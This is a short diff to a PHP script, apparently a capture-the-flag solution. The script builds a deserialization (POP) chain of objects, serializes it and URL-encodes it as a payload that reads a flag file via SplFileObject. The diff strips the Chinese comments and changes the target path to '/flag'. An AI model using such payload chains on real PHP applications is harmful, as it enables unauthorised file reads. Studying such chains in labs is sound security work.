@@ -565,7 +565,6 @@ class Philosopher {
     public $fruit11 = "213";
 }
 
-// 构建POP链
 $mystery = new Mystery();
 
 $philosopher = new Philosopher();
@@ -579,7 +578,7 @@ $samurai->fruit6 = $warlord;
 
 $cherry = new CherryBlossom($samurai);
 
-// 生成Payload
+
 $payload = serialize($cherry);
 echo urlencode($payload);
 ?>
@@ -602,7 +601,7 @@ class Samurai {
     public $fruit6;
 }
 class Mystery {
-    public $SplFileObject = "/flag_is_h3re.txt"; // 假设的flag文件名
+    public $SplFileObject = "/flag"; 
 }
 class Philosopher {
     public $fruit10;
